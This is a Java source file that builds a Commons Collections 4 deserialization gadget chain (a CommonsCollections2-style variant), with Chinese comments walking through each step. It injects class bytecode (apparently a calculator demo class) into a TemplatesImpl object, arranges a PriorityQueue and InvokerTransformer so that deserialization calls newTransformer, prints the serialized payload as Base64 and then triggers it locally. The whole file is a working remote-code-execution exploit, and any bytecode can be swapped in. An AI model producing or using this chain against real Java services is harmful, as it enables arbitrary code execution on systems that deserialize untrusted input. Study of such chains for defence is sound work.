import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC2_plus {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void main(String[] args)throws Exception {
        //创建TemplatesImpl对象加载字节码
        byte[] code = ClassPool.getDefault().get("ysoserial.vulndemo.Calc").toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_name","jiang");
        setFieldValue(obj,"_class",null);
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(obj,"_bytecodes",new byte[][]{code});

        //创建TranformingComparator 实例
        Transformer transformer = new InvokerTransformer("toString",null,null);
        Comparator comparator = new TransformingComparator(transformer);

        //创建 PriorityQueue 实例
        //readobject 入口
        PriorityQueue priorityQueue = new PriorityQueue(2,comparator);
        priorityQueue.add(obj);
        priorityQueue.add(obj);

        //修改调用方法为newTransformer，加载恶意类。
        setFieldValue(transformer,"iMethodName","newTransformer");

        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(priorityQueue);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();
    }
}
